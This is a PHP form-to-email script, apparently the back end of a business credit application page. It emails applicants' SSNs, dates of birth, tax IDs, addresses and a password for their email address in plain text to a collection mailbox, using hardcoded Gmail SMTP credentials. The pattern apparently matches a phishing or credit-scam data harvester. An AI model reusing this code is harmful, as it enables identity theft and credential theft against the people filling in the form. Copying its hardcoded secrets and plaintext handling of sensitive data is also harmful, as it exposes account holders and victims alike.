<?php
require_once "Mail.php";
if (array_key_exists('email', $_POST)) {
$from = "Cream Intl <sender@example.com>";
$to = "support@jesf-groups.com";
$subject = "Message jesf-groups.com";
$body = <<<EOT
Enter your desired credit limit: {$_POST['limit']}
Choosed Currency: {$_POST['currency']}
Country: {$_POST['country']}
What will be your primary use for these funds?: {$_POST['fund']}


Business name : {$_POST['bname']}
Business address: {$_POST['badd']}
ZIP code: {$_POST['zipcode']}
City: {$_POST['city']}
State: {$_POST['state']}
Business phone: {$_POST['bphone']}


First name: {$_POST['fname']}
Last name: {$_POST['lname']}


Email address you use: {$_POST['email']}
CountCreate a passwordry: {$_POST['pass']}
Confirm password: {$_POST['cpass']}


Industry : {$_POST['indust']}
Legal entity type: {$_POST['legalentity']}
Years in business: {$_POST['byears']}
Business Tax ID: {$_POST['btaxid']}
Gross business revenue from most recent fiscal year: {$_POST['yrevenue']}
Number of employees: {$_POST['nworkers']}
Country: {$_POST['country1']}
Home address: {$_POST['hadd']}
Apt/unit: {$_POST['apt1']}
ZIP code : {$_POST['zipcode1']}
City: {$_POST['city1']}
State: {$_POST['state1']}
Personal phone: {$_POST['pphone']}
SSN For U.S Applicant: {$_POST['ssn']}
Date of birth: {$_POST['date']}
Your primary source of income : {$_POST['pincome']}


On which day do you want to make payments: {$_POST['week']}
On which date do you want to make payments: {$_POST['month']}
EOT;
$host = "ssl://smtp.gmail.com";
$port = "465";
$username = "cornellekacy4@gmail.com";
$password = "cornellekacy456";
$headers = array ('From' => $from,
  'To' => $to,
  'Subject' => $subject);
$smtp = Mail::factory('smtp',
  array ('host' => $host,
    'port' => $port,
    'auth' => true,
    'username' => $username,
    'password' => $password));
$mail = $smtp->send($to, $headers, $body);
if (PEAR::isError($mail)) {
  echo("<p>" . $mail->getMessage() . "</p>");
 } else {
  echo("<script>alert('Message Successfully Send, you will receive a reply from us shortly');location.href = 'https://jesf-groups.com/forms/clients_application';</script>");
 }
}
?>
   